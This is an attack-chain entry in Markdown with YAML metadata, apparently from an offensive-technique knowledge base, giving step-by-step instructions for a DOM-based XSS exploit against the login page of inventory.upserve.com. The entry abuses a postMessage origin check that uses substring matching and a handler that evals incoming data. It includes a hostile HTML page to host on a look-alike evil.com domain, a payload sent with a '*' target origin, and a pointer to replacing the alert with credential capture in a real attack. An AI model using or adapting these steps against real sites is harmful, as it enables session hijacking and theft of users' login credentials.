---
tags:
  - xss
  - dom-xss
  - postmessage
  - origin-bypass
  - credential-theft
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Host-Malicious-Page-on-Bypassing-Domain]]'
  - '[[procedures/Trigger-postMessage-from-Malicious-Page]]'
  - '[[procedures/Execute-Arbitrary-JavaScript-on-Target]]'
step_count: 3
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:19.911Z'
description: >-
  Exploits a DOM-based XSS vulnerability in the login page of
  inventory.upserve.com by bypassing origin validation in postMessage handlers
  using a malicious domain substring match, leading to arbitrary JavaScript
  execution and potential credential theft.
skill_level: intermediate
impact_level: high
id: d33ba8c1-25c6-4633-b571-75e44b56575c
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# DOM-based XSS via Insecure postMessage Origin Validation in Upserve Inventory Login

Multi-stage attack chain demonstrating exploitation of a DOM-based XSS vulnerability in the postMessage event listener on the Upserve inventory login page. The attack leverages an incomplete origin check using indexOf, allowing malicious domains with 'https://hq.upserve.com' as a substring to send executable payloads via postMessage, resulting in arbitrary JavaScript execution that could steal login credentials.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Host Malicious Page] --> B[Trigger postMessage]
    B --> C[Execute JS on Target]
    C --> D[Steal Credentials]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome Developer Tools for testing)
- Domain hosting service to register a bypassing domain

### Target Environment

- Web platform
- Target URL: https://inventory.upserve.com/login/
- Vulnerable JavaScript handler: window.addEventListener('message')

### Initial Access Requirements

- Ability to host a malicious HTML page on a domain containing 'https://hq.upserve.com' as a substring (e.g., https://evilhttps://hq.upserve.com.evil.com)
- User interaction: Victim must visit the malicious page and interact with it while having the target login page open

## Detailed Attack Procedures

### Step 1: Host Malicious Page on Bypassing Domain
procedure: [[procedures/Host-Malicious-Page-on-Bypassing-Domain]]

**Objective**: Set up a malicious webpage on a domain that tricks the target's origin validation check.

**Instructions**: Register and host an HTML page on a domain like 'https://hq.upserve.com.evil.com' (note the substring match). The page should include JavaScript to open or reference the target login page and prepare a postMessage payload.

```html
<!DOCTYPE html>
<html>
<head><title>Malicious Page</title></head>
<body>
    <a href="#" onclick="sendPayload()">Click to Proceed</a>
    <script>
        var targetWindow = window.open('https://inventory.upserve.com/login/', '_blank');
        function sendPayload() {
            // Payload prepared for next step
        }
    </script>
</body>
</html>
```

**Expected Output**: Malicious page accessible at https://hq.upserve.com.evil.com/upserve_xss.html, with a link that references the target.

**Success Indicators**:
- Page loads without errors
- Target login page opens in a new window or iframe

### Step 2: Trigger postMessage from Malicious Page
procedure: [[procedures/Trigger-postMessage-from-Malicious-Page]]

**Objective**: Send a postMessage event from the malicious domain to the target window, bypassing the origin check.

**Instructions**: From the malicious page, use JavaScript to send a postMessage with a payload containing executable code. The target's handler uses ~e.origin.indexOf('https://hq.upserve.com'), which passes for substring matches.

```javascript
// In the malicious page's sendPayload function
targetWindow.postMessage({exec: "alert('XSS Executed'); // or credential theft code"}, '*');
```

**Expected Output**: postMessage sent to the target window without origin rejection.

**Success Indicators**:
- No console errors on origin mismatch
- Target page receives the message event

### Step 3: Execute Arbitrary JavaScript on Target
procedure: [[procedures/Execute-Arbitrary-JavaScript-on-Target]]

**Objective**: The target's event listener executes the payload via eval, leading to XSS and potential data exfiltration.

**Instructions**: The vulnerable handler on the target executes eval(e.data['exec']), running the injected JavaScript. For demonstration, use an alert; in a real attack, capture form inputs or session data.

```javascript
// Vulnerable code on target (for reference):
window.addEventListener('message', function(e) {
    if (~e.origin.indexOf('https://hq.upserve.com')) {
        eval(e.data['exec']);
    }
});
// Payload execution: alert('DOM XSS via postMessage');
```

**Expected Output**: Alert box or console log on the target login page confirming execution.

**Success Indicators**:
- JavaScript runs in the context of the login page
- Potential credential capture if payload is modified (e.g., document.getElementById('username').value)

## Attack Chain Summary

### Key Achievements

1. Bypassed origin validation using substring matching in postMessage.
2. Achieved arbitrary JavaScript execution on a sensitive login page.
3. Enabled potential theft of user credentials through DOM manipulation.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
